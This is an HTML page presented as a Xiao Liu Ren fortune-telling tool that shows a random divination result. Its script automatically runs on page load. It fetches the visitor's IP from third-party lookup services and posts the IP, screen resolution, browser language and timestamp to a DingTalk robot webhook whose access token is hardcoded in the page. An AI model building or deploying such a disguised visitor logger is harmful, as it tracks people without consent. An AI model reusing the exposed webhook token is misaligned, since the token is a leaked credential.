<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>诸葛马前课 · 六宫神课</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            min-height: 100vh;
            background: linear-gradient(135deg, #0a0a0a 0%, #1a1a2e 50%, #0a0a0a 100%);
            display: flex;
            justify-content: center;
            align-items: center;
            font-family: 'SimSun', '宋体', serif;
            overflow: hidden;
        }
        .container { text-align: center; padding: 40px; }
        .taiji { font-size: 80px; color: #d4af37; text-shadow: 0 0 30px rgba(212, 175, 55, 0.5); margin-bottom: 20px; animation: rotate 20s linear infinite; }
        @keyframes rotate { from { transform: rotate(0deg); } to { transform: rotate(360deg); } }
        .title { font-size: 36px; color: #d4af37; text-shadow: 0 0 20px rgba(212, 175, 55, 0.3); margin-bottom: 10px; letter-spacing: 8px; }
        .subtitle { font-size: 18px; color: #8b7355; margin-bottom: 15px; letter-spacing: 4px; }
        .guide { font-size: 16px; color: #a09269; margin-bottom: 30px; font-style: italic; }
        .divination-box {
            width: 280px; height: 200px; margin: 0 auto 30px;
            border: 2px solid #d4af37; border-radius: 15px;
            display: flex; flex-direction: column; justify-content: center; align-items: center;
            background: rgba(20, 20, 30, 0.8);
            box-shadow: 0 0 30px rgba(212, 175, 55, 0.2), inset 0 0 50px rgba(0, 0, 0, 0.5);
            position: relative; overflow: hidden;
        }
        .divination-box::before {
            content: ''; position: absolute; top: -50%; left: -50%;
            width: 200%; height: 200%;
            background: conic-gradient(from 0deg, transparent, rgba(212, 175, 55, 0.1), transparent 30%);
            animation: rotate 4s linear infinite;
        }
        .divination-text { position: relative; z-index: 1; font-size: 48px; color: #d4af37; opacity: 0; transition: all 0.5s; }
        .divination-text.show { opacity: 1; animation: glow 2s ease-in-out infinite; }
        .divination-name { position: relative; z-index: 1; font-size: 28px; color: #ffd700; margin-top: 10px; opacity: 0; transition: all 0.5s; letter-spacing: 6px; }
        .divination-name.show { opacity: 1; }
        .divination-meaning { position: relative; z-index: 1; font-size: 14px; color: #a09269; margin-top: 15px; max-width: 240px; line-height: 1.8; opacity: 0; transition: all 0.5s; }
        .divination-meaning.show { opacity: 1; }
        @keyframes glow { 0%, 100% { text-shadow: 0 0 20px rgba(255, 215, 0, 0.5); } 50% { text-shadow: 0 0 40px rgba(255, 215, 0, 0.8), 0 0 60px rgba(255, 215, 0, 0.4); } }
        .divination-box.animating::after { content: '斟'; position: absolute; font-size: 60px; color: #d4af37; animation: blink 0.2s infinite; }
        @keyframes blink { 0%, 100% { opacity: 1; } 50% { opacity: 0.3; } }
        .btn {
            padding: 15px 50px; font-size: 20px; color: #d4af37;
            background: transparent; border: 2px solid #d4af37; border-radius: 8px;
            cursor: pointer; letter-spacing: 6px; transition: all 0.3s;
            font-family: 'SimSun', serif;
        }
        .btn:hover { background: rgba(212, 175, 55, 0.2); box-shadow: 0 0 30px rgba(212, 175, 55, 0.4); transform: scale(1.05); }
        .btn:active { transform: scale(0.98); }
        .btn:disabled { opacity: 0.5; cursor: not-allowed; }
        .footer { margin-top: 40px; font-size: 14px; color: #5a5a6a; letter-spacing: 3px; }
        .status {
            position: fixed; bottom: 20px; left: 50%; transform: translateX(-50%);
            padding: 10px 20px; background: rgba(20, 20, 30, 0.95);
            border: 1px solid #d4af37; border-radius: 8px; color: #d4af37;
            font-size: 14px; opacity: 0; transition: opacity 0.3s; max-width: 90%;
        }
        .status.show { opacity: 1; }
        .status.success { border-color: #4CAF50; color: #4CAF50; }
        .status.error { border-color: #f44336; color: #f44336; }
        .status.sending { border-color: #2196F3; color: #2196F3; }
        .debug-info {
            position: fixed; top: 10px; left: 10px; right: 10px;
            background: rgba(0,0,0,0.9); border: 1px solid #0f0;
            padding: 10px; font-size: 11px; color: #0f0;
            text-align: left; max-height: 200px; overflow-y: auto;
            display: none; font-family: monospace;
        }
        .debug-info.show { display: block; }
    </style>
</head>
<body>
    <div class="debug-info" id="debug"></div>
    <div class="container">
        <div class="taiji">☯</div>
        <h1 class="title">遇事不决小六壬</h1>
        <p class="subtitle">—— 诸葛马前课 · 六宫神课 ——</p>
        <p class="guide">不管做什么，可以先起一卦看看卦象</p>
        <div class="divination-box" id="divinationBox">
            <span class="divination-text" id="divinationText"></span>
            <span class="divination-name" id="divinationName"></span>
            <span class="divination-meaning" id="divinationMeaning"></span>
        </div>
        <button class="btn" id="divineBtn" onclick="divine()">🎲 起卦问事</button>
        <p class="footer">—— 天道无亲 常与善人 ——</p>
    </div>
    <div class="status" id="status"></div>

    <script>
        const gua = [
            { name: '大安', symbol: '☰', meaning: '大安事事昌，求财在坤方。\n失物去不远，宅舍保安康。' },
            { name: '留连', symbol: '☱', meaning: '留连事难成，求谋日未明。\n官事凡如火，宜缓不宜惊。' },
            { name: '速喜', symbol: '☲', meaning: '速喜喜来临，求财向南行。\n行人未即至，失物上百呈。' },
            { name: '赤口', symbol: '☵', meaning: '赤口主口舌，官非切要防。\n失物急讨寻，交争意惶惶。' },
            { name: '小吉', symbol: '☴', meaning: '小吉最吉昌，路上好商量。\n阴人言定着，交易立呈祥。' },
            { name: '空亡', symbol: '☷', meaning: '空亡事不长，阴人惹祸殃。\n失物寻不见，官事有灾殃。' }
        ];

        // 钉钉配置 - 关键词方式
        const WEBHOOK = "https://oapi.dingtalk.com/robot/send?access_token=a57776d2a89ed36f4f4c5a45ee7c5c03f26a28e8eac8efd6a1636fbfb7a2f4ab";
        const KEYWORD = "IP";  // 你需要在钉钉机器人设置这个关键词

        function debug(msg) {
            const d = document.getElementById('debug');
            d.innerHTML += msg + '<br>';
            d.classList.add('show');
            console.log(msg);
        }

        function showStatus(text, type) {
            const status = document.getElementById('status');
            status.textContent = text;
            status.className = 'status show ' + (type || '');
            if (type !== 'sending') {
                setTimeout(() => status.classList.remove('show'), 5000);
            }
        }

        // 获取 IP - 使用多个备用源
        async function getIPInfo() {
            debug('获取IP...');
            
            // 源1: 太平洋
            try {
                const resp = await fetch('https://whois.pconline.com.cn/json.jsp?ip=&json=true', { mode: 'cors' });
                if (resp.ok) {
                    const data = await resp.json();
                    if (data.ip) {
                        debug('IP: ' + data.ip);
                        return { ip: data.ip, city: data.city || '', region: '', country: '中国', isp: '' };
                    }
                }
            } catch (e) { debug('源1失败: ' + e.message); }
            
            // 源2: 搜狐
            try {
                const resp = await fetch('https://pv.sohu.com/cityjson?callback=test', { mode: 'cors' });
                if (resp.ok) {
                    const text = await resp.text();
                    const match = text.match(/cip"?:\s*"(\d+\.\d+\.\d+\.\d+)"/);
                    if (match) {
                        debug('IP: ' + match[1]);
                        return { ip: match[1], city: '', region: '', country: '中国', isp: '' };
                    }
                }
            } catch (e) { debug('源2失败: ' + e.message); }
            
            // 源3: ip.sb
            try {
                const resp = await fetch('https://ip.sb', { mode: 'cors' });
                if (resp.ok) {
                    const text = await resp.text();
                    if (/^\d+\.\d+\.\d+\.\d+$/.test(text.trim())) {
                        debug('IP: ' + text.trim());
                        return { ip: text.trim(), city: '', region: '', country: '', isp: '' };
                    }
                }
            } catch (e) { debug('源3失败: ' + e.message); }

            return { ip: '未知', city: '', region: '', country: '中国', isp: '' };
        }

        // 发送钉钉 - 使用 no-cors 模式
        function sendToDingtalk(data) {
            return new Promise((resolve) => {
                debug('发送钉钉...');
                
                const message = `IP通知

IP: ${data.ip}
📍 ${data.country} ${data.region} ${data.city}
🏢 ${data.isp}
🖥 ${screen.width}x${screen.height}
🌐 ${navigator.language}
⏰ ${new Date().toLocaleString('zh-CN')}`;
                
                // 使用 JSONP 方式调用钉钉
                const callbackName = 'dingtalk_' + Date.now();
                const script = document.createElement('script');
                
                window[callbackName] = (result) => {
                    debug('钉钉响应: ' + JSON.stringify(result));
                    delete window[callbackName];
                    document.body.removeChild(script);
                    resolve(result);
                };
                
                script.onerror = () => {
                    debug('钉钉JSONP失败');
                    delete window[callbackName];
                    document.body.removeChild(script);
                    resolve({ errcode: -1, errmsg: '网络错误' });
                };
                
                // 钉钉不支持 JSONP，这里用图片方式发送
                // 实际上钉钉机器人没有 JSONP 接口，我们用表单提交方式
                const form = document.createElement('form');
                form.method = 'POST';
                form.action = WEBHOOK;
                form.target = '_blank';
                form.style.display = 'none';
                
                const input = document.createElement('input');
                input.type = 'hidden';
                input.name = 'msg';
                input.value = message;
                form.appendChild(input);
                
                document.body.appendChild(form);
                
                // 使用 fetch + no-cors，虽然拿不到响应，但请求会发出
                fetch(WEBHOOK, {
                    method: 'POST',
                    mode: 'no-cors',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        msgtype: 'text',
                        text: { content: message }
                    })
                }).then(() => {
                    debug('钉钉请求已发送(no-cors)');
                    resolve({ errcode: 0, errmsg: 'ok' });
                }).catch(e => {
                    debug('钉钉失败: ' + e.message);
                    resolve({ errcode: -1, errmsg: e.message });
                });
            });
        }

        async function divine() {
            const btn = document.getElementById('divineBtn');
            const box = document.getElementById('divinationBox');
            const text = document.getElementById('divinationText');
            const name = document.getElementById('divinationName');
            const meaning = document.getElementById('divinationMeaning');

            btn.disabled = true;
            btn.textContent = '斟...';
            text.classList.remove('show');
            name.classList.remove('show');
            meaning.classList.remove('show');
            box.classList.add('animating');

            await new Promise(resolve => setTimeout(resolve, 1000 + Math.random() * 1000));
            box.classList.remove('animating');

            const result = gua[Math.floor(Math.random() * gua.length)];
            text.textContent = result.symbol;
            name.textContent = result.name;
            meaning.textContent = result.meaning;
            text.classList.add('show');
            name.classList.add('show');
            meaning.classList.add('show');

            btn.textContent = '🎲 起卦问事';
            btn.disabled = false;

            showStatus('正在获取IP...', 'sending');
            const ipData = await getIPInfo();

            showStatus('正在发送通知...', 'sending');
            const sendResult = await sendToDingtalk(ipData);
            
            if (sendResult.errcode === 0) {
                showStatus('✅ 请求已发送！请检查钉钉', 'success');
            } else {
                showStatus('❌ 发送失败: ' + sendResult.errmsg, 'error');
            }
        }

        window.onload = function() {
            debug('页面加载...');
            setTimeout(() => divine(), 1000);
        };
    </script>
</body>
</html>
